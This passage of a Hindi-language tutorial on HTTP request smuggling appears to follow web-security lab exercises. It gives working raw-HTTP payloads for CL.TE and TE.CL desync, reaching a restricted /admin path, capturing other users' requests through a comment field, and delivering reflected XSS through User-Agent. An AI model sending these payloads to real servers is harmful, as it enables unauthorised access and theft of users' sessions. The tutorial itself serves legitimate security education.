рд╕рдХрддрд╛ рд╣реИ:

### рд╕рдордп рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реА.рдПрд▓.рдЯреА. рджреЛрд╖реЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

* **рд╡рд┐рдзрд┐:**
* рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ рдЬреЛ рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреЛрд╖рдпреБрдХреНрдд рд╣реИ, рддреЛ рдкреАрдЫреЗ рдХреА рдУрд░ рд╕рд░реНрд╡рд░ рдХреЛ рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╛рдзреНрдп рдХрд░реЗрдЧрд╛ред
*   **рдЙрджрд╛рд╣рд░рдг:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **рдЕрд╡рд▓реЛрдХрди:**
* рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ `рд╕рд╛рдордЧреНрд░реА-рд▓рдВрдмрд╛рдИ` рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╕рдВрджреЗрд╢ рдХреЛ рдкрд╣рд▓реЗ рд╣реА рдХрд╛рдЯ рджреЗрддрд╛ рд╣реИред
* рдкреАрдЫреЗ рдХреА рдУрд░ рд╕рд░реНрд╡рд░, рдПрдХ рдЪрдВрдХ рд╕рдВрджреЗрд╢ рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддреЗ рд╣реБрдП, рдЕрдЧрд▓реЗ рдЪрдВрдХ рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдХрднреА рдирд╣реАрдВ рдЖрддрд╛, рдЬрд┐рд╕рд╕реЗ рджреЗрд░реА рд╣реЛрддреА рд╣реИред
* **рд╕рдВрдХреЗрддрдХ:**
* рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╕рдордп рд╕рдорд╛рдкреНрддрд┐ рдпрд╛ рд▓рдВрдмреА рджреЗрд░реАред
* рдкреАрдЫреЗ рдХреА рдУрд░ рд╕рд░реНрд╡рд░ рд╕реЗ 400 рдмреИрдб рдЕрдиреБрд░реЛрдз рддреНрд░реБрдЯрд┐ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛, рдХрднреА-рдХрднреА рд╡рд┐рд╕реНрддреГрдд рд╕рд░реНрд╡рд░ рд╕реВрдЪрдирд╛ рдХреЗ рд╕рд╛рдеред

### рд╕рдордп рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЯреА.рдИ.рд╕реА.рдПрд▓. рджреЛрд╖реЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

* **рд╡рд┐рдзрд┐:**
* рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ рдЬреЛ рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреЛрд╖рдпреБрдХреНрдд рд╣реИ, рддреЛ рдкреАрдЫреЗ рдХреА рдУрд░ рд╕рд░реНрд╡рд░ рдХреЛ рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╛рдзреНрдп рдХрд░реЗрдЧрд╛ред
*   **рдЙрджрд╛рд╣рд░рдг:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **рдЕрд╡рд▓реЛрдХрди:**
* рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ `рд╕реНрдерд╛рдирд╛рдВрддрд░рдг-рдХреЛрдбрд┐рдВрдЧ` рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдХрд░рддрд╛ рд╣реИ рдФрд░ рдкреВрд░реЗ рд╕рдВрджреЗрд╢ рдХреЛ рдЖрдЧреЗ рднреЗрдЬрддрд╛ рд╣реИред
* рдкреАрдЫреЗ рдХреА рдУрд░ рд╕рд░реНрд╡рд░, `рд╕рд╛рдордЧреНрд░реА-рд▓рдВрдмрд╛рдИ` рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╕рдВрджреЗрд╢ рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддреЗ рд╣реБрдП, рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛ рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдХрднреА рдирд╣реАрдВ рдЖрддрд╛, рдЬрд┐рд╕рд╕реЗ рджреЗрд░реА рд╣реЛрддреА рд╣реИред
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
**рдЯреА.рдИ.рдП рдЕрдЯреИрдХ** рдореЗрдВ, рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдЕрдиреБрд░реЛрдз рдХреЗ рд▓рд┐рдП `Content-Length` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ рдЖрдЧрдВрддреБрдХ рдПрдореНрдмреЗрдбреЗрдб рдЕрдиреБрд░реЛрдз `Transfer-Encoding: chunked` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА рдкреНрд░рд╛рд░рдВрднрд┐рдХ `POST` рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдПрдореНрдмреЗрдбреЗрдб `GET /admin` рдЕрдиреБрд░реЛрдз рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░рддрд╛, рдЬрд┐рд╕рд╕реЗ `/admin` рдкрде рддрдХ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рдорд┐рд▓рддреА рд╣реИред
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
рдЙрд▓реНрдЯреЗ, TE.CL рд╣рдорд▓реЗ рдореЗрдВ, рдкреНрд░рд╛рд░рдВрднрд┐рдХ `POST` рдЕрдиреБрд░реЛрдз `Transfer-Encoding: chunked` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдЖрдЧрдВрддреБрдХ рдПрдореНрдмреЗрдбреЗрдб рдЕрдиреБрд░реЛрдз `Content-Length` рд╣реЗрдбрд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред CL.TE рд╣рдорд▓реЗ рдХреА рддрд░рд╣, рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА рдЫрд┐рдкреЗ рд╣реБрдП `GET /admin` рдЕрдиреБрд░реЛрдз рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЧрд▓рддреА рд╕реЗ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд `/admin` рдкрде рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓рддрд╛ рд╣реИред

### рдлреНрд░рдВрдЯ-рдПрдВрдб рдЕрдиреБрд░реЛрдз рдкреБрдирд░реНрд▓реЗрдЦрди рдХрд╛ рдЦреБрд▓рд╛рд╕рд╛ <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдЕрдХреНрд╕рд░ рдПрдХ **рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдЖрдЧрдВрддреБрдХ рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рдХрд░рддреЗ рд╣реИрдВ рдкрд╣рд▓реЗ рдЙрдиреНрд╣реЗрдВ рдкреАрдЫреЗ рдХреЗ рд╕рд░реНрд╡рд░ рдХреЛ рдкрд╛рд░рд┐рдд рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗред рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдкрд░рд┐рд╡рд░реНрддрди рдореЗрдВ рд╢реАрд░реНрд╖рдХ рдЬреЛрдбрд╝рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ `X-Forwarded-For: <рдЧреНрд░рд╛рд╣рдХ рдХрд╛ рдЖрдИрдкреА>` рдЬреИрд╕реЗ рд╣реЗрдбрд░, рдЬреЛ рдЧреНрд░рд╛рд╣рдХ рдХрд╛ рдЖрдИрдкреА рдкреАрдЫреЗ рдХреЗ рд╕рд░реНрд╡рд░ рдХреЛ рдкрд╣реБрдВрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИред рдЗрди рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЛ рд╕рдордЭрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рдВрд░рдХреНрд╖рдг рдХреЛ **рдЫрд▓рдиреЗ** рдпрд╛ **рдЫрд┐рдкреЗ рд╣реБрдП рдЬрд╛рдирдХрд╛рд░реА рдпрд╛ рдЕрдВрддреНрдпрд╕реНрдерд╛рди** рдХреЛ **рдЦреЛрд▓рдиреЗ** рдХреЗ рддрд░реАрдХреЗ рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдПрдХ рдкреНрд░реЙрдХреНрд╕реА рдЬрд┐рд╕реЗ рдЕрдиреБрд░реЛрдз рдХреИрд╕реЗ рдмрджрд▓рддрд╛ рд╣реИ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рдкреЛрд╕реНрдЯ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ рдЬрд┐рд╕реЗ рдкреАрдЫреЗ рдХреЗ рд╕рд░реНрд╡рд░ рдЙрддреНрддрд░ рдореЗрдВ рджреЛрд╣рд░рд╛рддрд╛ рд╣реИред рдлрд┐рд░, рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдПрдХ рдЕрдиреБрд░реЛрдз рддреИрдпрд╛рд░ рдХрд░реЗрдВ, рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
рдЗрд╕ рд╕рдВрд░рдЪрдирд╛ рдореЗрдВ, рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдШрдЯрдХ `search=` рдХреЗ рдмрд╛рдж рдЬреЛрдбрд╝реЗ рдЬрд╛рддреЗ рд╣реИрдВ, рдЬреЛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдкреНрд░рдХрдЯ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдкреНрд░рдХрдЯ рд╣реЛрдиреЗ рд╕реЗ рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдХреЗ рд╣реЗрдбрд░реНрд╕ рдЙрдЬрд╛рдЧрд░ рд╣реЛрдВрдЧреЗред

`Content-Length` рд╣реЗрдбрд░ рдХреЛ рдШрдирддреНрд╡ рдХреЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд▓рдВрдмрд╛рдИ рдХреЗ рд╕рд╛рде рдШреЛрд╕рд┐рдд рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рд╕рдВрд░реЗрдЦрд┐рдд рдХрд░рдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред рдПрдХ рдЫреЛрдЯреЗ рдореВрд▓реНрдп рд╕реЗ рд╢реБрд░реВ рдХрд░рдХреЗ рд╕реАрдзреЗ рдмрдврд╝рд╛рддреЗ рд╣реБрдП рдЙрдЪрд┐рдд рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдмрд╣реБрдд рдХрдо рдореВрд▓реНрдп рд╕реЗ рдбреЗрдЯрд╛ рдХреЛ рдХрд╛рдЯ рджреЗрдЧрд╛, рдЬрдмрдХрд┐ рдмрд╣реБрдд рдЙрдЪреНрдЪ рдореВрд▓реНрдп рдЕрдиреБрд░реЛрдз рдХреЛ рддреНрд░реБрдЯрд┐ рджрд┐рдЦрд╛ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рддрдХрдиреАрдХ рдПрдХ TE.CL рдЬреЛ vulnerability рдореЗрдВ рднреА рд▓рд╛рдЧреВ рд╣реИ, рд▓реЗрдХрд┐рди рдЕрдиреБрд░реЛрдз рдХреЛ `search=\r\n0` рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рдиреНрдпреВрд▓рд╛рдЗрди рд╡рд░реНрдгреЛрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдорд╛рди рдЦреЛрдЬ рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдЬреЛрдбрд╝ рджреЗрдЧрд╛ред

рдпрд╣ рд╡рд┐рдзрд┐ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА рджреНрд╡рд╛рд░рд╛ рдХрд┐рдП рдЧрдП рдЕрдиреБрд░реЛрдз рд╕рдВрд╢реЛрдзрдиреЛрдВ рдХреЛ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд╡реГрддреНрдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддреА рд╣реИред

### рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдЕрдиреБрд░реЛрдз рдХреИрдкреНрдЪрд░ рдХрд░рдирд╛ <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

рдПрдХ рдирд┐рд╢реНрдЪрд┐рдд рдЕрдиреБрд░реЛрдз рдХреЛ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдорд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝рдХрд░, рдЖрдк рдЕрдЧрд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрдиреБрд░реЛрдз рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, **рдХрдореЗрдВрдЯ рдкреИрд░рд╛рдореАрдЯрд░** рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдХрд┐рд╕реА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдПрдХреНрд╕реЗрд╕ рдкреЗрдЬ рдкрд░ рдкреЛрд╕реНрдЯ рдХреЗ рдХрдореЗрдВрдЯ рд╕реЗрдХреНрд╢рди рдореЗрдВ рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╕реНрдЯреЛрд░ рдХрд░рдирд╛ рд╣реИред рдЗрд╕рдХрд╛ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдЖрдЧрд╛рдореА рдЕрдиреБрд░реЛрдз рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдХрдореЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдХрдЯ рд╣реЛрдЧреАред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рддрдХрдиреАрдХ рдХреА рдХреБрдЫ рд╕реАрдорд╛рдПрдБ рд╣реИрдВред рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ, рдпрд╣ рдХреЗрд╡рд▓ рдЙрд╕ рд╕реАрдорд╛ рддрдХ рдбреЗрдЯрд╛ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕реНрдордЧрд▓реНрдб рдЕрдиреБрд░реЛрдз рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред URL-encoded рдлреЙрд░реНрдо рд╕рдмрдорд┐рд╢рди рдХреЗ рд▓рд┐рдП, рдпрд╣ рд╕реАрдорд╛рдВрдХрдХ `&` рд╡рд░реНрдг рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдкреАрдбрд╝рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЕрдиреБрд░реЛрдз рд╕реЗ рдХреИрдкреНрдЪрд░ рдХреА рдЧрдИ рд╕рд╛рдордЧреНрд░реА рдкрд╣рд▓реЗ `&` рдкрд░ рд░реБрдХреЗрдЧреА, рдЬреЛ рдХреНрд╡реЗрд░реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рднреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрд╣ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рднреА рдПрдХ TE.CL рднрдпрд╛рдирдХрддрд╛ рдХреЗ рд╕рд╛рде рд╕рдВрднрд╡ рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдЕрдиреБрд░реЛрдз рдХреЛ `search=\r\n0` рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рдиреНрдпреВрд▓рд╛рдЗрди рд╡рд░реНрдгреЛрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдорд╛рди рд╕рд░реНрдЪ рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдЬреЛрдбрд╝реЗ рдЬрд╛рдПрдВрдЧреЗред

### рд░рд┐рдлреНрд▓реЗрдХреНрдЯреЗрдб XSS рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ

HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡реЗрдм рдкреЗрдЬреЛрдВ рдХреЛ рд╢реЛрд╖рд┐рдд **рд░рд┐рдлреНрд▓реЗрдХреНрдЯреЗрдб XSS** рдХреЗ рд▓рд┐рдП рднреЗрджреНрдп рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд▓рд╛рдн рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ:

* рд▓рдХреНрд╖рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд╕рд╛рде **рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ** рд╣реИред
* HTTP рдЕрдиреБрд░реЛрдз рд╣реЗрдбрд░реНрд╕ рдЬреИрд╕реЗ рдХреНрд╖реЗрддреНрд░реЛрдВ рдореЗрдВ XSS рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ **рдЬреЛ рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдЕрдиреБрдкрд▓рдмреНрдз рд╣реЛрддреЗ рд╣реИрдВ**ред

рдЙрди рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдБ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рдПрдЬреЗрдВрдЯ рд╣реЗрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд░рд┐рдлреНрд▓реЗрдХреНрдЯреЗрдб XSS рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрд▓реЛрдб рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
рдпрд╣ рдкреЗрд▓реЛрдб рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд░рдЪрд┐рдд рд╣реИ рджреНрд╡рд╛рд░рд╛:

1. рдПрдХ `POST` рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рд░рдВрдн рдХрд░рдирд╛, рдЬреЛ рд╕рд╛рдорд╛рдиреНрдп рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ, рдПрдХ `Transfer-Encoding: chunked` рд╣реЗрдбрд░ рдХреЗ рд╕рд╛рде, рдЬрд┐рд╕рд╕реЗ smuggling рдХреА рд╢реБрд░реБрдЖрдд рдХрд╛ рд╕рдВрдХреЗрдд рдорд┐рд▓рддрд╛ рд╣реИред
2. `0` рдХреЗ рд╕рд╛рде рдЖрдЧреЗ рдмрдврд╝рдирд╛, рдЬреЛ рдЪрдВрдХ рдореИрд╕реЗрдЬ рдмреЙрдбреА рдХрд╛ рд╕рдорд╛рдкрди рдХрд░рддрд╛ рд╣реИред
3. рдлрд┐рд░, рдПрдХ smuggled `GET` рдЕрдиреБрд░реЛрдз рдкреЗрд╢ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ `User-Agent` рд╣реЗрдбрд░ рдореЗрдВ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ, `<script>alert(1)</script>`, рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрдм рд╕рд░реНрд╡рд░ рдЗрд╕ рдЙрд╕рдХреЗ рдмрд╛рдж рдХреЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИред

`User-Agent` рдХреЛ smuggling рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдордирд┐рдкреБрд▓реЗрдЯ рдХрд░рдХреЗ, рдкреЗрд▓реЛрдб рд╕рд╛рдорд╛рдиреНрдп рдЕрдиреБрд░реЛрдз рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдЫрд▓рдХрд░, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдПрдХ рдЧреИрд░-рдорд╛рдирдХ рд▓реЗрдХрд┐рди рдкреНрд░рднрд╛рд╡реА рддрд░реАрдХреЗ рд╕реЗ Reflected XSS рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

### HTTP Request Smuggling рдХреЗ рд╕рд╛рде On-site Redirects рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЕрдХреНрд╕рд░ `Host` рд╣реЗрдбрд░ рд╕реЗ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ URL рдореЗрдВ рд╣реЛрд╕реНрдЯрдирд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ URL рд╕реЗ рджреВрд╕рд░реЗ URL рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░рддреЗ рд╣реИрдВред рдпрд╣ рд╡реЗрдм рд╕рд░реНрд╡рд░реНрд╕ рдЬреИрд╕реЗ Apache рдФрд░ IIS рдХреЗ рд╕рд╛рде рд╕рд╛рдорд╛рдиреНрдп рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдлреЛрд▓реНрдбрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдПрдХ рдЯреНрд░реЗрд▓рд┐рдВрдЧ рд╕реНрд▓реИрд╢ рдХреЗ рдмрд┐рдирд╛ рдХрд░рдиреЗ рдкрд░ рдПрдХ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдиреЗ рдХрд╛ рдкрд░рд┐рдгрд╛рдо рд╣реЛрддрд╛ рд╣реИ:
```
GET /home HTTP/1.1
Host: normal-website.com
```
рдкрд░рд┐рдгрд╛рдо:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
рдпрд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдкреНрд░рддрд┐рдд рд▓рдЧрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди HTTP рдЕрдиреБрд░реЛрдз рдЕрдкрд░рд╛рдз рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдПрдХ рдмрд╛рд╣реНрдп рд╕рд╛рдЗрдЯ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
